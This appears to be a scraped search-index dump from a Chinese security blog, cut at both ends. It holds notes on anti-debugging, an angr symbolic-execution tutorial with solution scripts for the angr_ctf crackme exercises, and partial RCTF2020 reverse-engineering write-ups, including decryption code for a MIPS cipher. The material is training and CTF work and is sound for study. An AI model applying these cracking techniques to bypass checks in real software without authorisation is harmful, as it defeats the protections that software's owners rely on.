VirtualProtect(sub_402B50, 0xBCu, 0x40u, \u0026flOldProtect); return sub_4032A0(","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:4:0","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"参考链接 反调试技术总结 白话windows之四 异常处理机制(VEH、SEH、TopLevelEH…) 动态反调试技术 静态反调试技术 2020 空指针 5月RE公开赛 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:5:0","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"基础 #coding=utf-8 import angr import networkx as nx import matplotlib matplotlib.use('Agg') import matplotlib.pyplot as plt proj = angr.Project('/bin/true') print proj.filename # 文件名 print proj.arch # 一个 archinfo.Arch 对象 print hex(proj.entry) # 入口点 loader = proj.loader for obj in loader.all_objects: # 程序加载时会将二进制文件和共享库映射到虚拟地址中,所有对象文件 print obj # 二进制文件本身是main_object print loader.main_object print hex(loader.main_object.min_addr) print hex(loader.main_object.max_addr) ## 但是通常会选择关闭auto_load_libs,避免angr加载共享库 proj = angr.Project('/bin/true', auto_load_libs=False) print proj.loader.all_objects # project.factory 提供了很多类对二进制文件进行分析 # project.factory.block() 用于从给定地址解析一个 basic block，对象类型为 Block block = proj.factory.block(proj.entry) print block.pp() # 打印 print block.instructions # 指令数量 print block.instruction_addrs # 指令地址 # 将block类型转换为其他形式 print block.capstone.pp() print block.vex.pp() # 程序的执行需要初始化一个模拟程序状态的 SimState 对象 state = proj.factory.entry_state() # 该对象包含了程序的内存、寄存器、文件系统数据等等模拟运行时动态变化的数据 print state.regs # 寄存器 print state.regs.rip # BV64对象 print state.regs.rsp print state.regs.rsp.length print state.mem[proj.entry].int.resolved # 将入口点的内存解释为c语言的int类型 # 这里的 BV，即 bitvectors，可以理解为一个比特串，用于在 angr 里表示 CPU 数据。看到在这里 rdi 有点特殊，它没有具体的数值，而是在符号执行中所使用的符号变量 # python int与bitvector之间的转换 bv = state.solver.BVV(0x1234, 32) # 创建一个32位的bitvector对象，值为0x1234 print hex(state.solver.eval(bv)) bv = state.solver.BVV(0x1234, 64) # 64位 # bitvector之间的数学运算 one = state.solver.BVV(1, 64) one_hundred = state.solver.BVV(2, 64) print one + one_hundred # 位数相同时可以直接运算 five = state.solver.BVV(5, 27) print one + five.zero_extend(64 - 27) # 位数不同时需要进行扩展 print one + five.sign_extend(64 - 27) # 有符号扩展 # 使用 bitvectors 可以直接来设置寄存器和内存的值，当传入的是 Python int 时，angr 会自动将其转换成 bitvectors # \u003e\u003e\u003e state.regs.rsi = state.solver.BVV(3, 64) # \u003e\u003e\u003e state.regs.rsi # \u003cBV64 0x3\u003e # \u003e\u003e\u003e state.mem[0x1000].long = 4 # 在地址 0x1000 存放一个 long 类型的值 4 # \u003e\u003e\u003e state.mem[0x1000].long.resolved # .resolved 获取 bitvectors # \u003cBV64 0x4\u003e # \u003e\u003e\u003e state.mem[0x1000].long.concrete # .concrete 获得 Python int # 4L # 初始化的 state 可以经过模拟执行得到一系列的 states，模拟管理器（Simulation Managers）的作用就是对这些 states 进行管理 simgr = proj.factory.simulation_manager(state) print simgr.active # 当前状态 simgr.step() # 模拟执行一个basic block print simgr.active # 当前状态被更新 print simgr.active[0].regs.rip # active[0] 是当前 state # attention: 被改变的仅仅是simgr的状态，原始状态并不会被改变 print state.regs.rip # angr 提供了大量函数用于程序分析，在这些函数在 Project.analyses. p = angr.Project('/bin/true', load_options={'auto_load_libs': False}) cfg = p.analyses.CFGFast() nx.draw(cfg.graph) # 画图 plt.savefig('temp.png') ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:1:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"00_angr_find find的使用 import angr, sys def main(): filename = \"00_angr_find\" proj = angr.Project(filename) initial_state = proj.factory.entry_state() simgr = proj.factory.simgr(initial_state) address = 0x8048675 simgr.explore(find=address) if simgr.found: solution = simgr.found[0] print(solution.posix.dumps(sys.stdin.fileno())) if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:2:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"01_angr_avoid avoid的使用 import angr, sys def main(): filename = \"01_angr_avoid\" proj = angr.Project(filename) initial_state = proj.factory.entry_state() simgr = proj.factory.simgr(initial_state) address = 0x80485B5 simgr.explore(find=address, avoid=0x80485A8) if simgr.found: solution = simgr.found[0] print(solution.posix.dumps(sys.stdin.fileno())) if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:3:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"带参数执行 import angr, claripy proj = angr.Project('./angr2', auto_load_libs=False) argv1 = claripy.BVS(\"argv1\", 9 * 8) // 这里用的单位是bit，因此需要乘以8 state = proj.factory.entry_state(args=['./angr2', argv1]) // 导入参数 simgr = proj.factory.simgr(state) print(simgr.explore(find=0x4007DC, avoid=0x4007EA)) print(simgr.found[0].solver.eval(argv1, cast_to=bytes)) // 直接输出是ascii码，用cast_to=bytes转为bytes类型 ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:4:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"02_angr_find_condition find 跟 avoid 参数可以是一个你已经确定感兴趣或要避免的地址（或者是地址列表）或者是一个可以动态选择“是否感兴趣”的函数。 import angr, sys def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) # (1) if b'Good Job.' in stdout_output: # (2) return True # (3) else: return False def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b'Try again.' in stdout_output: return True else: return False def main(): filename = \"02_angr_find_condition\" proj = angr.Project(filename) initial_state = proj.factory.entry_state() simgr = proj.factory.simgr(initial_state) simgr.explore(find=is_successful, avoid=should_abort) if simgr.found: solution = simgr.found[0] print(solution.posix.dumps(sys.stdin.fileno())) if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:5:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"03_angr_symbolic_registers 当调用 scanf()的时候，angr无法处理复杂的格式。可以将符号值注入寄存器。也可以自己选择开始执行的地址，不一定要从entry开始执行，需要用 blank_state() 方法替代了entry_state()。 #coding=utf-8 import angr, sys, claripy def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) # (1) if b'Good Job.' in stdout_output: # (2) return True # (3) else: return False def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b'Try again.' in stdout_output: return True else: return False def main(): filename = \"03_angr_symbolic_registers\" proj = angr.Project(filename) start_address = 0x8048980 initial_state = proj.factory.blank_state(addr=start_address) # 用 claripy 通过 BVS() 方法生成三个位向量。这个方法需要两个参数：第一个参数表示符号名，第二个参数表示这个符号的长度 单位bit。位数与寄存器的位数相同，是32位 password_size_in_bits = 32 password0 = claripy.BVS('password0', password_size_in_bits) password1 = claripy.BVS('password1', password_size_in_bits) password2 = claripy.BVS('password2', password_size_in_bits) # 更新寄存器的内容 initial_state.regs.eax = password0 initial_state.regs.ebx = password1 initial_state.regs.edx = password2 simgr = proj.factory.simgr(initial_state) simgr.explore(find=is_successful, avoid=should_abort) if simgr.found: solution_state = simgr.found[0] # 根据注入的三个符号值调用求解引擎的 eval()方法； format() 方法格式化解并去掉16进制的 “0x”。 solution0 = format(solution_state.solver.eval(password0), 'x') # (1) solution1 = format(solution_state.solver.eval(password1), 'x') solution2 = format(solution_state.solver.eval(password2), 'x') solution = solution0 + \" \" + solution1 + \" \" + solution2 print(\"[+] Success! Solution is: {}\".format(solution)) else: raise Exception('Could not find the solution') if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:6:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"04_angr_symbolic_stack 上面一个是变量储存在寄存器上，所以可以直接设置寄存器，这里是变量储存在栈上。针对栈的操作需要注意调整一下栈空间. #coding=utf-8 import angr, sys, claripy def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) # (1) if b'Good Job.' in stdout_output: # (2) return True # (3) else: return False def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b'Try again.' in stdout_output: return True else: return False def main(): filename = \"04_angr_symbolic_stack\" proj = angr.Project(filename) start_address = 0x08048697 initial_state = proj.factory.blank_state(addr=start_address) initial_state.regs.ebp = initial_state.regs.esp # 模拟mov ebp, esp # esp减8再push进两个4字节的变量，相当于sub esp, 0x10 padding_length_in_bytes = 8 initial_state.regs.esp -= padding_length_in_bytes password0 = claripy.BVS('password0', 32) password1 = claripy.BVS('password1', 32) # 压栈 initial_state.stack_push(password0) initial_state.stack_push(password1) simgr = proj.factory.simgr(initial_state) simgr.explore(find=is_successful, avoid=should_abort) if simgr.found: solution_state = simgr.found[0] solution0 = format(solution_state.solver.eval(password0), 'x') # (1) solution1 = format(solution_state.solver.eval(password1), 'x') solution = solution0 + \" \" + solution1 print(\"[+] Success! Solution is: {}\".format(solution)) else: raise Exception('Could not find the solution') if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:7:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"05_angr_symbolic_memory angr处理内存 #coding=utf-8 import angr, sys, claripy def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) # (1) if b'Good Job.' in stdout_output: # (2) return True # (3) else: return False def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b'Try again.' in stdout_output: return True else: return False def main(): filename = \"05_angr_symbolic_memory\" proj = angr.Project(filename) start_address = 0x80485FE initial_state = proj.factory.blank_state(addr=start_address) password = claripy.BVS('password', 256) user_input_address = 0xA1BA1C0 # 将内容写入内存 initial_state.memory.store(user_input_address, password) simgr = proj.factory.simgr(initial_state) simgr.explore(find=is_successful, avoid=should_abort) if simgr.found: solution_state = simgr.found[0] solution = solution_state.solver.eval(password, cast_to=bytes) print(\"[+] Success! Solution is: {}\".format(solution.decode('utf-8'))) else: raise Exception('Could not find the solution') if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:8:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"06_angr_symbolic_dynamic_memory 上面05中是把输入的内容直接存储在user_inout处的固定地址上，而这道题中，buffer0和buffer1中存储的是malloc分配内存的地址，这个地址是动态的，地址指向的内容才是真正的输入。所以首先要将输入符号存储在内存中，然后将内存地址写入buffer0和buffer1。 #coding=utf-8 import angr, sys, claripy def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) # (1) if b'Good Job.' in stdout_output: # (2) return True # (3) else: return False def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) if b'Try again.' in stdout_output: return True else: return False def main(): filename = \"06_angr_symbolic_dynamic_memory\" proj = angr.Project(filename) start_address = 0x8048696 initial_state = proj.factory.blank_state(addr=start_address) password0 = claripy.BVS('password0', 64) password1 = claripy.BVS('password1', 64) fake_heap_address0 = 0xffffc93c # (1) pointer_to_malloc_memory_address0 = 0xabcc8a4 # (2) fake_heap_address1 = 0xffffc94c # (3) pointer_to_malloc_memory_address1 = 0xabcc8ac # (4) # 将buffer0, buffer1中写入虚假的堆地址 initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=proj.arch.memory_endness) # (5) initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=proj.arch.memory_endness) # (6) # 在堆地址中写入输入的符号内容 initial_state.memory.store(fake_heap_address0, password0) # (7) initial_state.memory.store(fake_heap_address1, password1) # (8) simgr = proj.factory.simgr(initial_state) simgr.explore(find=is_successful, avoid=should_abort) if simgr.found: solution_state = simgr.found[0] solution0 = solution_state.solver.eval(password0, cast_to=bytes) solution1 = solution_state.solver.eval(password1, cast_to=bytes) solution = solution0 + b\" \" + solution1 print(\"[+] Success! Solution is: {}\".format(solution.decode('utf-8'))) else: raise Exception('Could not find the solution') if __name__ == \"__main__\": main() ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:9:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"07_angr_symbolic_file 符号化文件中的内容 import angr import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) start_addr = 0x080488D6 init_state = project.factory.blank_state(addr = start_addr) filename = \"OJKSQYDP.txt\" file_size = 0x40 password = init_state.solver.BVS(\"password\", file_size) # SimFile是构造文件信息，包括文件名，文件内容和文件大小 simgr_file = angr.storage.SimFile( filename, content=password, size=file_size) # angr.fs.insert是将文件插入到文件系统中，需要文件名与符号化的文件 init_state.fs.insert(filename, simgr_file) simgr = project.factory.simgr(init_state) def is_successful(state): return b\"Good Job.\" in state.posix.dumps(1) def should_abort(state): return b\"Try again.\" in state.posix.dumps(1) print(simgr.explore(find=is_successful, avoid=should_abort)) if simgr.found: print(simgr.found[0].solver.eval(password, cast_to=bytes)) else: raise(Exception(\"Solution not found.\")) if __name__ == \"__main__\": main(sys.argv) ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:10:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"08_angr_constraints 自己添加约束条件 int __cdecl main(int argc, const char **argv, const char **envp) { signed int i; // [esp+Ch] [ebp-Ch] password = 1146115393; dword_804A044 = 1380994638; dword_804A048 = 1381647695; dword_804A04C = 1112233802; memset(\u0026buffer, 0, 0x11u); printf(\"Enter the password: \"); __isoc99_scanf(\"%16s\", \u0026buffer); for ( i = 0; i \u003c= 15; ++i ) *(_BYTE *)(i + 134520912) = complex_function(*(char *)(i + 134520912), 15 - i); if ( check_equals_AUPDNNPROEZRJWKB((int)\u0026buffer, 0x10u) ) puts(\"Good Job.\"); else puts(\"Try again.\"); return 0; } 原函数check_equals_AUPDNNPROEZRJWKB是一个比较简单的函数，但是因为字符一个一个比较会产生路径爆炸问题，所以当执行到这个函数里面时，我们用自己的方法来实现，实现的方法是添加约束add_constraints import angr import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) start_addr = 0x08048625 init_state = project.factory.blank_state(addr = start_addr) buff_addr = 0x0804A050 password = init_state.solver.BVS(\"password\", 16 * 8) init_state.memory.store(buff_addr, password) simgr = project.factory.simgr(init_state) check_addr = 0x08048565 # 当找到这个函数时 simgr.explore(find = check_addr) if simgr.found: check_state = simgr.found[0] desired_string = \"AUPDNNPROEZRJWKB\" check_param1 = buff_addr check_param2 = 0x10 # 获取内存地址处的值 check_bvs = check_state.memory.load(check_param1, check_param2) check_constraint = desired_string == check_bvs check_state.add_constraints(check_constraint) print(check_state.solver.eval(password, cast_to = bytes)) if __name__ == \"__main__\": main(sys.argv) 也可以直接对check函数进行hook import angr import claripy import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) initial_state = project.factory.entry_state() # call check_equals_AUPDNNPROEZRJWKB处的地址 check_equals_called_address = 0x8048673 instruction_to_skip_length = 5 @project.hook(check_equals_called_address, length=instruction_to_skip_length) def skip_check_equals_(state): user_input_buff_address = 0x804a054 user_input_buff_length = 16 user_input_string = state.memory.load( user_input_buff_address, user_input_buff_length ) check_against_string = \"XKSPZSJKJYQCQXZV\" # 函数对比的结果保存在eax中返回 state.regs.eax = claripy.If ( user_input_string == check_against_string, claripy.BVV(1, 32), claripy.BVV(0, 32) ) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(1) return b\"Good Job.\" in stdout_output def should_abort(state): stdout_output = state.posix.dumps(1) return b\"Try again.\" in stdout_output simulation.explore(find = is_successful, avoid = should_abort) if simulation.found: print(simulation.found[0].posix.dumps(0)) else: raise(Exception(\"Could not find the solution\")) if __name__ == \"__main__\": main(sys.argv) ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:11:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"10_angr_simprocedures 使用函数名进行hook(出现多个地方call func的时候对每个call指令地址进行hook太麻烦，针对有符号的函数) import angr import claripy import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) initial_state = project.factory.entry_state() class mySimPro(angr.SimProcedure): def run(self, user_input, user_input_length): angr_bvs = self.state.memory.load ( user_input, user_input_length ) check_string = \"ORSDDWXHZURJRBDH\" return claripy.If ( check_string == angr_bvs, claripy.BVV(1, 32), claripy.BVV(0, 32) ) check_symbol = \"check_equals_ORSDDWXHZURJRBDH\" project.hook_symbol(check_symbol, mySimPro()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(1) return b\"Good Job.\" in stdout_output def should_abort(state): stdout_output = state.posix.dumps(1) return b\"Try again.\" in stdout_output simulation.explore(find = is_successful, avoid = should_abort) if simulation.found: print(simulation.found[0].posix.dumps(0)) else: raise(Exception(\"Could not find the solution\")) if __name__ == \"__main__\": main(sys.argv) 还可以用符号hook scanf函数 import angr import claripy import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) initial_state = project.factory.entry_state() class ReplacementScanf(angr.SimProcedure): def run(self, format_string, scanf0_address, scanf1_address): scanf0 = claripy.BVS('scanf0', 32) scanf1 = claripy.BVS('scanf1', 32) self.state.memory.store(scanf0_address, scanf0, endness = project.arch.memory_endness) self.state.memory.store(scanf1_address, scanf1, endness = project.arch.memory_endness) self.state.globals['solutions'] = (scanf0, scanf1) scanf_symbol = \"__isoc99_scanf\" project.hook_symbol(scanf_symbol, ReplacementScanf()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(1) return b\"Good Job.\" in stdout_output def should_abort(state): stdout_output = state.posix.dumps(1) return b\"Try again.\" in stdout_output simulation.explore(find = is_successful, avoid = should_abort) if simulation.found: solution_state = simulation.found[0] stored_solutions = solution_state.globals['solutions'] scanf0_solution = solution_state.solver.eval(stored_solutions[0], cast_to = bytes) scanf1_solution = solution_state.solver.eval(stored_solutions[1], cast_to = bytes) print(scanf0_solution, scanf1_solution) else: raise(Exception(\"Could not find the solution\")) if __name__ == \"__main__\": main(sys.argv) ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:12:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"12_angr_veritesting 学习使用Veritesting的技术解决路径爆炸问题 Python Veritesting 结合静态符号执行和动态符号执行 把限制式全部合并到一条路径上 减少 path explosion 的影响 project.factory.simgr(initial_state, veritesting=True) IDA打开，其中这个循环会在二叉决策的时候导致路径爆炸 for ( i = 0; i \u003c= 31; ++i ) { v5 = *((char *)s + i + 3); if ( v5 == complex_function(75, i + 93) ) ++v15; } import angr import claripy import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state, veritesting = True) def is_successful(state): stdout_output = state.posix.dumps(1) return b\"Good Job.\" in stdout_output def should_abort(state): stdout_output = state.posix.dumps(1) return b\"Try again.\" in stdout_output simulation.explore(find = is_successful, avoid = should_abort) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(0)) else: raise(Exception(\"Could not find the solution\")) if __name__ == \"__main__\": main(sys.argv) ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:13:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"13_angr_static_binary 针对静态编译的程序，angr提供了一些常用库函数的实现,eg: # angr.SIM_PROCEDURES['libc']['malloc'] # angr.SIM_PROCEDURES['libc']['fopen'] # angr.SIM_PROCEDURES['libc']['fclose'] # angr.SIM_PROCEDURES['libc']['fwrite'] # angr.SIM_PROCEDURES['libc']['getchar'] # angr.SIM_PROCEDURES['libc']['strncmp'] # angr.SIM_PROCEDURES['libc']['strcmp'] # angr.SIM_PROCEDURES['libc']['scanf'] # angr.SIM_PROCEDURES['libc']['printf'] # angr.SIM_PROCEDURES['libc']['puts'] # angr.SIM_PROCEDURES['libc']['exit'] 需要找到这些函数进行hook import angr import claripy import sys def main(argv): bin_path = argv[1] project = angr.Project(bin_path) initial_state = project.factory.entry_state() simulation = project.factory.simgr(initial_state) project.hook(0x804ed40, angr.SIM_PROCEDURES['libc']['printf']()) project.hook(0x804ed80, angr.SIM_PROCEDURES['libc']['scanf']()) project.hook(0x804f350, angr.SIM_PROCEDURES['libc']['puts']()) project.hook(0x8048d10, angr.SIM_PROCEDURES['glibc']['__libc_start_main']()) def is_successful(state): stdout_output = state.posix.dumps(1) return b\"Good Job.\" in stdout_output def should_abort(state): stdout_output = state.posix.dumps(1) return b\"Try again.\" in stdout_output simulation.explore(find = is_successful, avoid = should_abort) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(0)) else: raise(Exception(\"Could not find the solution\")) if __name__ == \"__main__\": main(sys.argv) ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:14:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["notes"],"content":"参考链接 https://xz.aliyun.com/t/6557 https://lantern.cool/2020/05/15/note-tool-angr/ https://xz.aliyun.com/t/7117 https://github.com/firmianay/CTF-All-In-One/blob/master/doc/5.3.1_angr.md ","date":"2020-06-06","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/:15:0","tags":null,"title":"angr使用","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B8%83%E5%A4%A9-angr_ctf/"},{"categories":["writeup"],"content":"go-flag 首先用IDAGolangHelper恢复符号 恢复符号以后可以看到一共生成了3k多个goroutine，main_main_func1用来获取输入，每次读入一个字符，然后通过chan传给其他的rountine，发送字符到chan使用了runtime_chansend1, 从chan读取字符使用的是runtime_chanrecv1函数，x查找一下调用了runtime_chanrecv1函数的地方，这些函数的个数差不多就是flag的长度。 选择一个调用runtime_chanrecv1的函数进行调试，发现距离这个函数不远的地方有字符判断操作 然后调试到这个地方发现前几次出现的字符分别为RCF猜测就是正确flag，然后找到所有这种比较的函数把字符抄下来就行了。 ","date":"2020-06-06","objectID":"/rctf2020-%E9%83%A8%E5%88%86re/:1:0","tags":null,"title":"RCTF2020-部分re","uri":"/rctf2020-%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"cipher MIPS的程序用ghidra反编译可以看到加密逻辑，逆一下就可以了，注意端序和结束符问题。 #include\u003ccstdio\u003e #define ulonglong unsigned long long #define longlong long long using namespace std; void encrypt(char *ciphertext,char *plain) { ulonglong p1,p2; ulonglong *in_a2; int cycle; ulonglong t1,t2,c1,c2; p1 = *(ulonglong *)plain; p2 = *(ulonglong *)(plain + 8); //printf(\"P1 %llX P2 %llX\\n\",p1,p2); t2 = 0; t1 = 0; c2 = ((p2\u003e\u003e 8) + (p2\u003c\u003c 0x38) + p1) ^ t2; c1 = ((p1 \u003e\u003e 0x3d) + (p1 \u003c\u003c 3)) ^ c2; cycle = 0; while (cycle \u003c 0x1f) { t1 = ((t1 \u003e\u003e 8) + (t1 \u003c\u003c 0x38) + t2) ^ (longlong)cycle; t2 = ((t2 \u003e\u003e 0x3d) + (t2 \u003c\u003c 3)) ^ t1; //printf(\"%llX %llX %llX\\n\",c1,c2,t2); c2 = ((c2 \u003e\u003e 8) + (c2 \u003c\u003c 0x38) + c1) ^ t2; c1 = ((c1 \u003e\u003e 0x3d) + (c1 \u003c\u003c 3)) ^ c2; cycle = cycle + 1; } printf(\"%llX %llX %llX %llX\\n\",c1,c2,t1,t2); *(ulonglong *)ciphertext = c1; *(ulonglong *)(ciphertext + 8) = c2; return; } ulonglong t1s[40],t2s[40]; void genFlows(ulonglong k1,ulonglong k2) { ulonglong t2 = k2,t1 = k1,cycle = 0; while (cycle \u003c 0x1f) { t1 = (t1 \u003e\u003e 8) + (t1 \u003c\u003c 0x38) + t2 ^ (longlong)cycle; t2 = ((t2 \u003e\u003e 0x3d) + (t2 \u003c\u003c 3)) ^ t1; t1s[cycle]=t1; t2s[cycle]=t2; cycle+=1; //printf(\"%d\\n\",cycle); } // printf(\"Get Key Flows\\n\"); } void decrypt(ulonglong k1,ulonglong k2,char *ciphertext,char *plain) { genFlows(k1,k2); ulonglong c1,c2; c1 = *(ulonglong *)ciphertext; c2 = *(ulonglong *)(ciphertext + 8); longlong cycle = 0x1f; while (cycle \u003e 0) { /*c2 = (c2 \u003e\u003e 8) + (c2 \u003c\u003c 0x38) + c1 ^ t2s[cycle]; c1 = ((c1 \u003e\u003e 0x3d) + (c1 \u003c\u003c 3)) ^ c2;*/ cycle = cycle - 1; c1 ^= c2; c1 = ((c1 \u003c\u003c 